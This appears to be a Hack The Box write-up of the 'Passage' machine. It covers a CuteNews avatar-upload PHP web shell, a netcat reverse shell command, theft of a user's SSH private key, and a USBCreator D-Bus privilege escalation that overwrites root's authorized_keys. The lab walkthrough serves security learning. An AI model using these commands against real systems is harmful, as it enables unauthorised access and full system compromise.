We got 2 ports in our target machine.
  • Port 22 – SSHD service.
  • Port 80 – Apache Web Server.

    • Port - 80

  • News page. There is nothing interesting except a disclosure about NMS (News Management System) Cutenews.
  • From the bottom of the page, we can see this. After some googling, I found that we can visit the NMS panel after placing CuteNews on the web page.
  • A Sign-in/Register panel. I quickly signed in.
  • But nothing I found useful. Interestingly, I got the version of CuteNews in the same page.

    • CVE – Arbitrary File Upload – www-data Shell

  • A simple Googling throw me a useful article in Exploit-DB understand
  • CuteNews – Avatar Abusing : https://www.exploit-db.com/exploits/37474
  • Based on the reference above, we can upload a malicious JPG file containing malicious PHP code in it to cause RCE.
  • Just like the Magic machine, we can writeup our PHP code inside an image file using the ExifTool tool.
    • Important After Adding The Comment Change The File name to dedsec.jpg to change.php or Anything You Want But Extension is .php.
    Let’s register an account and upload it to the avatar section.
    After saving changes, we can now able to visit the location of our uploaded PHP file.
    We got the www-data web shell in our Browser

  • I executed this command to get a reverse shell nc 10.10..... 1234 -e /bin/bash

    We Can Cat SSH Keys Of Nadav:

root@DEDSEC:~# ssh -i id_rsa nadav@passage.htb

nadav@passage:~$
  • We’re Nadav in the server now. Since he is in multiple groups, I tried to list Sudo privileges. Unfortunately, it asked for a password which we don’t have.

    • Dbus – USB Controller Privilege Escalation – Root:

  • Listing all the process gave me a hint for Root.
  • Dbus – USBCreator – Priviesc https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/

    • Pre Requirements:

  • The user must be in the Sudoers group. Here in our case, Nadav is in the Sudoers group.
  • The user must have executable privileges to the dbus tool.
    • Okay! We have everything we need. Let’s launch our attack. As we already know the dbus system block as com.ubuntu.USBCreator by default, we can send a system call to Dbus message.
    1
2

4

    
nadav@passage:~$ echo "your id_rsa.pub key" > ~/authorized_keys
nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/authorized_keys /root/.ssh/authorized_keys true
()
nadav@passage:~$
